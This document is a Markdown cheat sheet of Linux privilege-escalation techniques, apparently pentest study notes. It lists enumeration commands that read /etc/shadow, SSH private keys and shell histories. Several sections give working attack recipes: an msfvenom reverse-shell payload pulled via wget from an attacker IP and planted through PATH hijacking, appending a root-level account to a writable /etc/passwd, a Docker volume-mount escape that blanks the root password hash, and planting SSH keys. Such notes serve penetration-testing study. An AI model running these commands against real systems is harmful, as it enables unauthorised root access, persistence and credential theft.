# :unlock: Linux PE :penguin:

**<u>General Strategy/Order of Things to check:</u>**

1. Run the [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)/[LinEnum](https://github.com/rebootuser/LinEnum) Scripts

2. Run [SUID](https://github.com/Anon-Exploiter/SUID3NUM) Python script checker

3. Look around for any installed files, bash history, open ports, config files

   - web server directories `/var/www/html/`

   - passwords, usernames, db

      ```bash
      grep -R -i password .
      grep -R -i pass .
      grep -R -i db .
      grep -R -i username .
      ```

   - /var/backups

   - /opt/

   - Files owned by root

     ```bash
     find / -perm -4000 2>/dev/null | xargs ls -la
     ```

   - Files owned by a specific user

     ```bash
     find / -user onuma -exec ls -lad {} \; 2>/dev/null | grep -v '/proc'
     ```

   - Files running in the background

     ```bash
     find / -iname *backuperer* -exec ls -lad {} \; 2>/dev/null 
     ```

     File types and check if they're not empty

     ```bash
     find . -type f
     du -hs [file]
     ```

   - Source codes of the service exploited to gain initial

   - Processes with no absolute path

4. Run [PSPY](https://github.com/DominicBreuker/pspy) to check any ongoing processes being called back

   - ```
     chmod +x pspy32
     ./pspy32
     #look for any with UID=0
     ```

5. Kernel Priv Esc

   - Run [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
   - [Linux Exploit Suggester 1](https://github.com/mzet-/linux-exploit-suggester)

6. Switch to other users you have creds to, then redo entire initial checks

   - ```bash
     su $username
     ```

     

**<u>Manual Commands for Enumeration</u>**

```bash
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Kernel Version
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
cat /proc/version
uname -a
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Operating System Version
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
cat /etc/issue
cat /etc/*-release
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Users
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
id
who
w
cat /etc/passwd | cut -d: -f1             # list of users
cat /etc/group | cut -d: -f1              # list of groups
awk -F: '($3 == "0") {print}' /etc/passwd # list of super users
awk -F: '($3 == "0") {print}' /etc/group  # list of super groups
cat /etc/sudoers
sudo -l
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Environmental Variables
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
env
set
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
cat ~/.profile
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# User History
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# SSH Private Keys
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# User Files
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
ls -ahlR /root/
ls -ahlR /home/
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Restricted Files
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Network Info
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
/sbin/ifconfig -a
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/network/interfaces
cat /etc/networks
cat /etc/iptables
iptables -L
hostname
dnsdomainname
arp -e
route
/sbin/route -nee
lpstat -a
netstat -antupxl
ss -anp
chkconfig --list
last
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Mounted Drives
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
mount
df -h
cat /etc/fstab
lsblk
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Jobs/Tasks
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Running Processes/Drivers
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
ps aux
ps -ef | grep root
for d in $(lsmod | cut -d' ' -f1); do modinfo $d && printf '\n'; done
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Service Configurations
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
cat /etc/services
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# File System Permissions
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
# sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
find / -perm -1000 -type d -exec ls -lad {} \; 2>/dev/null
# SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -g=s -type f -exec ls -lad {} \; 2>/dev/null
# SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -u=s -type f -exec ls -lad {} \; 2>/dev/null
# world-writeable folders
find / -perm -222 -type d -exec ls -lad {} \; 2>/dev/null
# world-executable folders
find / -perm -o x -type d -exec ls -lad {} \; 2>/dev/null
# world-writeable & executable folders
find / \( -perm -o w -perm -o x \) -type d -exec ls -ld {} \; 2>/dev/null
# world-writeable files
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print 2>/dev/null
# no owner files
find /dir -xdev \( -nouser -o -nogroup \) -print 2>/dev/null
 
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null  # anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null    # owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null # group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null     # other
 
find /etc/ -readable -type f 2>/dev/null             # anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null # anyone
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Installed Applications
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
ls -ahl /opt/
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archives
ls -alh /var/cache/yum/
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Application Logs
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
cat /var/lib/dhcp3/dhclient.leases
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Passwords
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
find . -name *.php -print0 2>/dev/null | xargs -0 grep -i -n var $password
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
```



**<u>Incomplete Path:</u>**

![scp](./linux/scp.png)

```bash
# generate the payload
msfvenom -p linux/x86/shell_reverse_tcp \
         LHOST=192.168.119.131 \
         LPORT=6969 \
         -f elf \
         -o pwn.elf
# start a listener
nc -nvlp 443
# host payload
sudo python3 -m http.server 80
# download payload and rename it
wget -P /tmp http://192.168.119.131/pwn.elf 
chmod +x /tmp/pwn.elf
mv /tmp/pwn.elf /tmp/scp
# trigger the vulnerability
export PATH=/tmp:$PATH
/usr/local/bin/uploadtosecure
```



**<u>Cross Compiling:</u>**

```bash
sudo apt install mingw-w64

#to a 32 bit linux
gcc -m32 -Wl,--hash-style=both 9542.c -o 9542_exploit

#to a windows
i686-w64-mingw32-gcc pwn.c -o root.exe -s -lws2_32
```



**<u>If /etc/passwd is writable</u>**

If /etc/passwd is writable, then it is possible to create a new user account with a known password that is in the root group number 0:

```bash
# on kali, generate new account & password
echo "pwn:$(openssl passwd -1 -salt password):0:0:root:/root:/bin/bash"
# on target, append new account to /etc/passwd
echo 'pwn:$1$pwn$/6sFNrgexhawhu9b.rXS60:0:0:root:/root:/bin/bash' >> /etc/passwd
#Then simply login as the new user:
su pwn
```

**<u>If in Docker Group:</u>**

```bash
groups
#check to see if in docker groups
#Start a new docker container and volume mount root directory:

cd /
sudo apt install docker.io
sudo usermod -aG docker [username]
docker run -v /:/mnt -it alpine

#Will be dropped into root of the container

cd mnt/
cd /root
vi etc/shadow

#Remove the * in root
#exit

su - root
```

**<u>If SSH is open you can get the keys or add new ones:</u>**

```bash
mkdir .ssh
cd .ssh
ssh-keygen -f id_rsa
cat id_rsa.pub > authorized_keys
cat id_rsa
#paste into local kali's id_rsa file
chmod 600 id_rsa
ssh -i id_rsa user@$ip
```

